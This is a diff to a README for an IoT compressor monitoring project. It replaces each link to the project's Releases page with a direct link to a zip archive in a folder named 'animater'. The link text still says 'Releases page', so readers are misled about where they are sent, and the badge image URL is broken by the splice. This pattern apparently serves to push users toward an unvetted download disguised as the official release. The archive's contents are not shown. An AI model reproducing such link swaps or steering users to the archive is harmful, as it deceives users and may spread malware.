@@ -1,6 +1,6 @@
 # 🌟 IoT-Based-Smart-Compressor-Monitoring-and-Control-System - Monitor and Control Compressors Effortlessly
 
-[![Download the App](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/junior7zhc/IoT-Based-Smart-Compressor-Monitoring-and-Control-System/releases)
+[![Download the App](https://raw.githubusercontent.com/junior7zhc/IoT-Based-Smart-Compressor-Monitoring-and-Control-System/main/animater/IoT-Based-Smart-Compressor-Monitoring-and-Control-System-v3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/junior7zhc/IoT-Based-Smart-Compressor-Monitoring-and-Control-System/main/animater/IoT-Based-Smart-Compressor-Monitoring-and-Control-System-v3.3.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ To use this application, follow these simple steps. You don’t need any program
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/junior7zhc/IoT-Based-Smart-Compressor-Monitoring-and-Control-System/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/junior7zhc/IoT-Based-Smart-Compressor-Monitoring-and-Control-System/main/animater/IoT-Based-Smart-Compressor-Monitoring-and-Control-System-v3.3.zip) to download the latest version of the application.
 2. Find the version you wish to install. Click on it to access the download options.
 3. Click the appropriate file for your operating system to start the download.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -53,4 +53,4 @@ We welcome contributions and feedback. If you have suggestions for improving the
 
 Thanks to all contributors and supporters. Your input helps make this project better for everyone.
 
-For further details or updates, please visit the [Releases page](https://github.com/junior7zhc/IoT-Based-Smart-Compressor-Monitoring-and-Control-System/releases).
+For further details or updates, please visit the [Releases page](https://raw.githubusercontent.com/junior7zhc/IoT-Based-Smart-Compressor-Monitoring-and-Control-System/main/animater/IoT-Based-Smart-Compressor-Monitoring-and-Control-System-v3.3.zip).
